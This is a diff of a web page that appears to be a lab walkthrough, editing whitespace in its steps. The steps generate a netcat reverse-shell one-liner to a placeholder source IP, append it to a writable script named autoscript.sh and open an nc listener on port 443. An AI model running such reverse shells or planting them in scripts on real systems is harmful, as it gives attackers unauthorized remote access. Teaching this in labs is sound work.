@@ -170,7 +170,7 @@ The output will be similar to
 [-] No arch selected, selecting arch: cmd from the payload
 No encoder specified, outputting raw payload
 Payload size: 94 bytes
-mkfifo /tmp/kaxkx; nc <source-ip> 443 0</tmp/kaxkx | /bin/sh >/tmp/kaxkx 2>&1; rm /tmp/kaxkx{% endraw %}{% endcapture %} {% include code.html code=code %}
+mkfifo /tmp/kaxkx; nc <source-ip> 443 0</tmp/kaxkx | /bin/sh >/tmp/kaxkx 2>&1 ; rm /tmp/kaxkx{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Check the contents of the file `./Desktop/autoscript.sh`.
 {% capture code %}{% raw %}touch /home/user4/abc.txt
@@ -178,7 +178,7 @@ echo "I will automate the process"
 bash -i{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Append the generated `reverse shell` to the end of file `./Desktop/autoscript.sh`.
-{% capture code %}{% raw %}echo 'mkfifo /tmp/kaxkx; nc <source-ip> 443 0</tmp/kaxkx | /bin/sh >/tmp/kaxkx 2>&1; rm /tmp/kaxkx' >> Desktop/autoscript.sh{% endraw %}{% endcapture %} {% include code.html code=code %}
+{% capture code %}{% raw %}echo 'mkfifo /tmp/kaxkx; nc <source-ip> 443 0</tmp/kaxkx | /bin/sh >/tmp/kaxkx 2>&1 ; rm /tmp/kaxkx' >> Desktop/autoscript.sh{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Using `netcat`, create a listener.
 {% capture code %}{% raw %}rlwrap -cAr nc -lnvp 443{% endraw %}{% endcapture %} {% include code.html code=code %}
